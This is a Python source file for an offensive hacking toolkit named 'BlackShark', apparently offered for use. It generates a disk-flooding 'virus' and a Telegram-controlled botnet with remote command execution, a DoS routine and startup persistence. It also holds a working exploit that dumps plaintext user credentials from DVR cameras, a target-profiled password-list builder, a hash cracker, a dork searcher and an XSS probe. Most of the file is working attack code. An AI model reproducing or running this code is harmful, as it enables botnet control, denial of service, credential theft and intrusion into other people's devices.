import requests
from time import sleep as s
from colorama import init
from random  import choice
import pathlib
import os
from json import *
import tableprint as tp
from googlesearch import search
init()
path = pathlib.Path()
bad = '\033[91m[-]\033[0m'
info = '\033[93m[!]\033[0m'
def theta(hashvalue, hashtype):
    response = requests.get('https://decrypt.tools/client-server/decrypt?type='+hashtype+'&string='+hashvalue).text
    try:
        return loads(response)['text']
    except:
        print(f'{bad} Oh no ! Not find...')
def Typee(hashvalue):
    result = False
    if len(hashvalue) == 32:
        print ('%s Hash function : md5' % info)
        return 'md5'
    elif len(hashvalue) == 40:
        print ('%s Hash function : SHA1' % info)
        return 'sha1'
    elif len(hashvalue) == 64:
        print ('%s Hash function : SHA-256' % info)
        return 'sha-256'
    elif len(hashvalue) == 96:
        print ('%s Hash function : SHA-384' % info)
        return 'sha-384'
    elif len(hashvalue) == 128:
        print ('%s Hash function : SHA-512' % info)
        return 'sha-512'
    else:
        print ('%s This hash type is not supported.' % bad)
        return False
Virus_mm = """
import random 

for x in range(1000000,99999999):
    lf = open('Tyron-VIRUS'+str(x)+'.BLACK-SHARK','w')
    lf.write(str('kosnanat\\n')*5787)
    lf.close()
"""
BotNet = """

from requests import post
from bs4 import BeautifulSoup
import json
import time
from platform import node
from socket import *
from os import system
import subprocess as sb
user = node()
user_1 = user.replace("-PC","")
#cmd = 'copy botnet.exe "C:\\Users\\{}\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\zeroday.exe"'.format(user_1)
system(cmd)


def DOS(target):
		if "https" or "http" in target:
				target = target.replace("https","")
				target = target.replace("http","")
		ip = gethostbyname(target)
		n = 0
		while n < 10000:
			n +=1
			s = socket(AF_INET , SOCK_STREAM)
			s.connect((ip,80))
			buff = "User-Agent:"+"A"*500
			s.send("GET / HTTP/1.1\\r\\n"+"\\n\\n"+buff)
			s.close()
			time.sleep(4)


while True:
    time.sleep(7)
    URL = "https://api.telegram.org/bot____TOKEN____/Getupdates"
    payload = {"UrlBox":URL,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }
    req = post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
    source = req.text
    soup = BeautifulSoup(source,"html.parser")
    resualt = soup.find("div" ,  id="ResultData").text
    resualt_2 = resualt.replace("Response Content","")
    DATA = json.loads(resualt_2)["result"]
    n = 0
    while True:
        n += 1
        try:
            DATA[n]['message']['text']
        except:
            key =  DATA[n-1]['message']['text']
            break
    print ("last key =",key)
    last_key = key
    if last_key == "/clients":
            time.sleep(2)
            URL_1 = "https://api.telegram.org/bot____TOKEN____/SendMessage?chat_id=____ID____&text=hi boss ! online="+str(node())+"\\n i coded by TyRoNe"
            payload_1 = {"UrlBox":URL_1,
                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
                }
            post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_1)

            time.sleep(10)

    elif last_key[0:4] == "/dos":
            try:
                URL_2 = "https://api.telegram.org/bot____TOKEN____/SendMessage?chat_id=____ID____&text=ok="+str(node())
                payload_2 = {"UrlBox":URL_2,
                    "AgentList":"Mozilla Firefox",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"POST"
                    }

                post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_2)


                target = last_key[5:]
                DOS(target)
            except: ...
			
    elif "/exec" in last_key:
            last_key = last_key.split(' ')
            if last_key[1] == str(node()):
                try:
                    command = last_key[2]
                    op = sb.check_output(command)
                    URL_2 = "https://api.telegram.org/bot____TOKEN____/SendMessage?chat_id=____ID____&text=ok="+str(node())+"=\\n"+op.decode()
                    payload_2 = {"UrlBox":URL_2,
                        "AgentList":"Mozilla Firefox",
                        "VersionsList":"HTTP/1.1",
                        "MethodList":"POST"
                        }
                    post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload_2)
                except:
                       pass
    else:
            continue
			
			
# end 
# pyinstaller --noconsole -F botnet.py
"""

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'

def BC():
    os.system('cls')
    os.system('clear')
    print(f"""
{lgn} ______   {lrd}_____  {pe}_______ {be}__   _ {yw}_______ {gn}_______
 {lgn}|_____] {lrd}|     |    {pe}|    {be}| \  | {yw}|______    {gn}|   
 {lgn}|_____] {lrd}|_____|   {pe} |    {be}|  \_| {yw}|______    {gn}|   
                                            
""")
    token = input(f'{yw}[!] {lgn}TOKEN BOT {pe}- >{lgn} ')
    numberid = input(f'{yw}[!] {lgn}Number id owner {yw}- >{lgn} ')
    BottNett = BotNet
    BottNett=BottNett.replace('____TOKEN____',token)
    BottNett=BottNett.replace('____ID____',numberid)
    print(f'{yw}[...]{lgn} Creating file ... ')
    Bot_net = open('botnet.py','w')
    Bot_net.write(BottNett)
    Bot_net.close()
    print(f'{lgn}[+] {yw}Created Botnet . \n{yw}[!]{lgn} path : '+str(path.cwd())+'\\botnet.py')
    print(f"""\n\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")
def HK():
    os.system('clear')
    os.system('cls')
    print(f'''
 _    _ {lrd}         {pe} _____{yw} _    _ {lgn}      {be} _  __{rd}_____{gn} _     \033[0m _      
{lgn}| |  | |{lrd}   /\    {pe}/ ____{yw}| |  | |{lgn}      {be}| |/ /{rd}_   _{gn}| |    \033[0m| |     
| |__| |{lrd}  /  \  {pe}| (___ {yw}| |__| |{lgn}______{be}| ' / {rd} | | {gn}| |    \033[0m| |     
|  __  |{lrd} / /\ \  {pe}\___ \{yw}|  __  |{lgn}______{be}|  <  {rd} | | {gn}| |    \033[0m| |     
{lgn}| |  | |{lrd}/ ____ \ {pe}____) {yw}| |  | |{lgn}      {be}| . \ {rd}_| |_{gn}| |____\033[0m| |____ 
{lgn}|_|  |_{lrd}/_/    \_\{pe}_____/{yw}|_|  |_|{lgn}      {be}|_|\_\{rd}_____{gn}|______\033[0m|______|                                                                                                   
''')
    Hsh = input(f'\n\n{info} give me HASH {lgn}- {lrd}> {yw}')
    HASHTYPE = Typee(Hsh)
    vl = theta(Hsh,HASHTYPE)
    try:
        print(f'{lgn}[+] \033[0m Hash cracked ! \n{yw}Result: {lgn}'+vl)
    except: 
        print(f'{info} {yw}please try by this site : https://hashes.com/en/decrypt/hash')
    print(f"""\n\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")

def DS():
    os.system('cls')
    os.system('clear')
    print(f"""
{lgn} ______  _              _      ______ _                 _     
{lrd}(____  \| |            | |    / _____) |               | |    
{rd} ____)  ) | _____  ____| |  _( (____ | |__  _____  ____| |  _ 
{yw}|  __  (| |(____ |/ ___) |_/ )\____ \|  _ \(____ |/ ___) |_/ )
{be}| |__)  ) |/ ___ ( (___|  _ ( _____) ) | | / ___ | |   |  _ ( 
{pe}|______/ \_)_____|\____)_| \_|______/|_| |_\_____|_|   |_| \_)
                                                              
""")
    OpO = input(f'{yw}[!] {lgn} give me dork : ')
    OpN = input(f'{yw}[!] {lgn} give me result number : ')
    sea = search(term=OpO,num_results=int(OpN))
    for url in sea:
        print(f"{lgn}[+] {yw} result : "+str(url))
    print(f"""\n\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")
def GN():
    print(f"""

{rd}___ {lgn}_   _ {yw}____ {pe}____ {gn}_  _ {rd}____ 
 {rd}|   {lgn}\_/  {yw}|__/ {pe}|  | {gn}|\\ | {rd}|___ 
 {rd}|    {lgn}|   {yw}|  \\ {pe}|__| {gn}| \| {rd}|___     


 {yw}I am {lrd} TyRoNe ! \n{yw}age : {lgn}19\n{yw}Country :{lgn} IRAN : 🇮🇷 \n\n\n
Github : {be}https://github.com/Tyrone-666
{lgn}{lgn}((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
\033[1;37m))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
)))))))))))))))))))))))))))))))))))){lrd}%\033[1;37m))){lrd}%\033[1;37m))){lrd}%\033[1;37m)))))))))))))))))))))))))))))))))))
))))))))))))))))))))))))))))))))))){lrd}%\033[1;37m){lrd}%\033[1;37m)){lrd}%\033[1;37m)){lrd}%\033[1;37m){lrd}%\033[1;37m))))))))))))))))))))))))))))))))))
))))))))))))))))))))))))))))))))))){lrd}%\033[1;37m){lrd}%\033[1;37m)){lrd}%\033[1;37m){lrd}.%\033[1;37m){lrd}%\033[1;37m))))))))))))))))))))))))))))))))))
))))))))))))))))))))))))))))))))))))))){lrd},%.\033[1;37m))))))))))))))))))))))))))))))))))))))
))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
{lrd}%%\033[1;37m){lrd}%\033[1;37m)))){lrd}%\033[1;37m){lrd}%\033[1;37m)))){lrd}%\033[1;37m)))))))))))){lrd}%\033[1;37m)))){lrd}%\033[1;37m){lrd}%\033[1;37m)))){lrd}%\033[1;37m)%(\033[1;37m))){lrd}%\033[1;37m)){lrd}%\033[1;37m)))))){lrd}%\033[1;37m)){lrd}%\033[1;37m))){lrd}%%\033[1;37m){lrd}%\033[1;37m)))){lrd}%\033[1;37m){lrd}%\033[1;37m)))){lrd}%
{lrd}%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
""")


def EX():
    HST     =   input(f'{yw}[!] \033[1;37mHost {yw}: ')
    port    =   input(f'{yw}[!] \033[1;37mPort {yw}: ')

    headers = {}

    fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
    host        =   "http://"+HST+":"+str(port)+"/"

    def makeReqHeaders(xCookie):
        headers["Host"]             =  host
        headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
        headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
        headers["Connection"]       = "close"
        headers["Content-Type"]     = "text/html"
        headers["Cookie"]           = "uid="+xCookie
        
        return headers

    try:
        rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
    except Exception as e:
        #print(e)
        print(f" {rd}[-] {yw}Timed out\n")
        exit()

    badJson = rX.text
    try:
        dataJson = loads(badJson)
        totUsr = len(dataJson["list"])
    except Exception as e:
        print(f" {rd}[+] {yw}Error: "+str(e))
        print(f" {rd}[>] {yw}json: "+str(rX))
        exit()


    print(f"\n {lgn}[+] {yw}DVR (url):\t\t{lgn}"+str(host))
    print(f" {lgn}[+] {yw}Port: \t\t{lgn}"+str(port))

    print(f"\n{lgn} [+] {yw}Users List:\t{lgn}"+str(totUsr))
    print(" ")

    final_data = []
    try:
        for obj in range(0,totUsr):

            temp = []

            _usuario    = dataJson["list"][obj]["uid"]
            _password   = dataJson["list"][obj]["pwd"]
            _role       = dataJson["list"][obj]["role"]

            temp.append(_usuario) 
            temp.append(_password)
            temp.append(_role)

            final_data.append(temp)

            hdUsr  =  f"{lgn}Username\033[1;37m" 
            hdPass = f"{lgn}Password\033[1;37m"
            hdRole = f"{lgn}Role ID\033[1;37m"

            cabeceras = [hdUsr, hdPass, hdRole] 

        tp.table(final_data, cabeceras, width=20)

    except Exception as e:
        print(f"{rd} [!]: "+str(e))
        print(f"{lrd} [-] "+ str(dataJson))

    print(" ")
def VP():
    os.system('cls')
    os.system('clear')

    print(f"""
{lgn}   ___  __         __    ______            __  
 {lgn} / _ )/ /__ _____/ /__ / __/ /  ___ _____/ /__
 \033[1;37m/ _  / / _ `/ __/  '_/_\ \/ _ \/ _ `/ __/  '_/
{lrd}/____/_/\_,_/\__/_/\_\/___/_//_/\_,_/_/ /_/\_\ 
""")
    print(f"""{yw}[!] {lgn}choose your virus : 
    {yw}1 : {lrd}Hard killer 
    {yw}2 : {lrd}soon ... 
    {yw}3 : {lrd}soon ...
          """)
    u = input(f' {yw}[!]  {lgn}enter - > {yw}')
    if u =='1':
        print(f'{yw}[...]{lgn} Creating file ... ')
        virus = open('virus.py','w')
        virus.write(Virus_mm)
        virus.close()
        print(f'{lgn}[+] {yw}Created virus . \n{yw}[!]{lgn} path : '+str(path.cwd())+'\\virus.py')
    print(f"""\n\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")
def CS():
    os.system('cls')
    os.system('clear')
    print(f""" 

{lrd}  _   _   _   _   _   _   _  
 / \ / \ / \ / \ / \ / \ / \ 
\033[1;37m( {lrd}B \033[1;37m| {lrd}- \033[1;37m| {lrd}S \033[1;37m| {lrd}H \033[1;37m| {lrd}A \033[1;37m| {lrd}R \033[1;37m| {lrd}K \033[1;37m)
{lgn} \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

""")
    Name = input(f'{yw}[!] {lgn}enter target\'s name - > ')
    age= input(f'{yw}[!] {lgn}enter target\'s age -> ')
    t = input(f'{yw}[!] {lgn}enter target\'s year -> ')
    k = input(f'{yw}[!] {lgn}enter last name -> ')
    ps = [Name+age,Name+'123',Name+'@'+age,Name+t,k+age,'p@ssw0rd','qwerty','qwertyui','qazwsxedc',age+'.'+t,k+t,k+age+age,k+'.'+Name,Name+'@'+k,t+t,Name+k,Name+age+age,Name+"_"+age,Name+"_"+t,t+'@'+t,'12345678','123456789','0123456789','1234567890','Aa123456',Name+'123456',Name+'.'+k]
    print(f'{lgn}[+] {yw}creating passlist ... ')
    psl = open('passlist.txt','w')
    for pas in ps:
        psl.write(pas+'\n')
    psl.close()
    print(f'{lgn}[+] {yw}passlist Created . \n{yw}[!]{lgn} path : '+str(path.cwd())+'\\passlist.txt')
    print(f"""\n\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")
def nagaeidam():
    ur = input(f'{info} Url (https://example.org/search.php?q=): ')
    payload = "<script>alert('XSS')</script>"
    response = requests.get(ur + payload)
    if payload in response.text:
        print(f'{lgn}[+] \033[1;37m xss !')
    else : 
        print(f'{bad} \033[1;37m not xss ... ')
List_bnr = [
f"""
{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{lgn}
|{pe}T{lgn}|{pe}y{lgn}|{pe}R{lgn}|{pe}o{lgn}|{pe}N{lgn}|{pe}e{lgn}|
{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+{yw}-{rd}+
""",
f"""
{rd}___ {lgn}_   _ {yw}____ {pe}____ {gn}_  _ {rd}____ 
 {rd}|   {lgn}\_/  {yw}|__/ {pe}|  | {gn}|\\ | {rd}|___ 
 {rd}|    {lgn}|   {yw}|  \\ {pe}|__| {gn}| \| {rd}|___                            
""",
f"""
{rd} _____    ______      _   _      
{gn}|_   _|   | ___ \\    | \\ | |     
{lgn}  | |_   _| |_/ /___ |  \\| | ___ 
{lrd}  | | | | |    // _ \| . ` |/ _ \\
{pe}  | | |_| | |\\ \\ (_) | |\\  |  __/
{yw}  \\_/\__, \\_| \\_\\___/\\_| \\_/\\___|
{be}      __/ |                      
{lgn}     |___/                       
""",
f"""
{rd} _______ __   __  ______  _____  __   _ _______
{lgn}    |      \_/   |_____/ |     | | \\  | |______
{yw}    |       |    |    \_ |_____| |  \_| |______
                                               
""",
f"""
{rd}88888888888     8888888b.         888b    888         
{yw}    888         888   Y88b        8888b   888         
{lgn}    888         888    888        88888b  888         
{gn}    888 888  888888   d88P .d88b. 888Y88b 888 .d88b.  
{pe}    888 888  8888888888P" d88""88b888 Y88b888d8P  Y8b 
{be}    888 888  888888 T88b  888  888888  Y8888888888888 
{gn}    888 Y88b 888888  T88b Y88..88P888   Y8888Y8b.     
{lgn}    888  "Y88888888   T88b "Y88P" 888    Y888 "Y8888  
{pe}             888                                      
{yw}        Y8b d88P                                      
{lgn}         "Y88P"                                       
""",
f"""

{lgn}_/// _//////         _///////              _///     _//          
{yw}     _//             _//    _//            _/ _//   _//          
{gn}     _//    _//   _//_//    _//     _//    _// _//  _//   _//    
{pe}     _//     _// _// _/ _//       _//  _// _//  _// _// _/   _// 
{be}     _//       _///  _//  _//    _//    _//_//   _/ _//_///// _//
{yw}     _//        _//  _//    _//   _//  _// _//    _/ //_/        
{rd}     _//       _//   _//      _//   _//    _//      _//  _////   
{lrd}             _//                                                 
""",
f"""
                                                                
{rd}_|_|_|_|_| {lgn}           {pe}_|_|_|    {be}          {yw}_|      _|            
{rd}    _|     {lgn} _|    _|  {pe}_|    _|  {be}  _|_|    {yw}_|_|    _|  {gn}  _|_|    
{rd}    _|     {lgn} _|    _|  {pe}_|_|_|    {be}_|    _|  {yw}_|  _|  _|  {gn}_|_|_|_|  
{rd}    _|     {lgn} _|    _|  {pe}_|    _|  {be}_|    _|  {yw}_|    _|_|  {gn}_|        
{rd}    _|     {lgn}   _|_|_|  {pe}_|    _|  {be}  _|_|    {yw}_|      _|  {gn}  _|_|_|  
            {lgn}      _|                                            
            {lgn}  _|_|                                              


""",
f"""
{rd}|''||''|          '||'''|,        '||\   ||`        
{yw}   ||              ||   ||         ||\\\\  ||         
{be}   ||    '||  ||`  ||...|' .|''|,  || \\\\ ||  .|''|, 
{pe}   ||     `|..||   || \\\\   ||  ||  ||  \\\\||  ||..|| 
{lgn}  .||.        ||  .||  \\\\. `|..|' .||   \||. `|...  
{lrd}           ,  |'                                    
{gn}            ''                                      

"""]
print(choice(List_bnr))
print(f"""\n{lrd}GitHub : {yw}https://github.com/{lgn}Tyrone{yw}-{lrd}666{yw}/BlackShark/\n\n{lgn}Enter number of your choice : \n       {yw}0. {lrd}Virus{lgn} by Python\n       {yw}1. {lrd}Botnet {lgn}Maker \n       {yw}2. {lrd}Dork {lgn}searcher \n       {yw}3. {lgn}create simple {lrd}password list\n       {yw}4. {lrd}Exploit {lgn}VMR Camera login\n       {yw}5. {lgn}Hash {lrd}kill {lgn}.\n       {yw}6. {lrd}Check {lgn} XSS . \n       {yw}7. {lrd}TyRoNe {lgn}INFO . \n       {yw}8. {lrd}Exit {yw}.\n""")

while True:
    cheeseberger =  input(f"{pe}"+str(path.cwd())+f"{yw}\{lrd}blackShark{lgn}-{yw}> {gn}")
    if cheeseberger not in ['0','1','2','3','4','5','6','7','exit']:
        os.system(cheeseberger)
    elif '0' in cheeseberger:
        VP()
    elif '1' in cheeseberger:
        BC()
    elif '2' in cheeseberger:
        DS()
    elif '3' in cheeseberger:
        CS()
    elif '4' in cheeseberger:
        EX()
    elif '5' in cheeseberger:
        HK()
    elif '6' in cheeseberger:
        nagaeidam()
    elif '7' in cheeseberger:
        GN()
    elif ('exit') in cheeseberger or  ('8') in cheeseberger :
        exit()
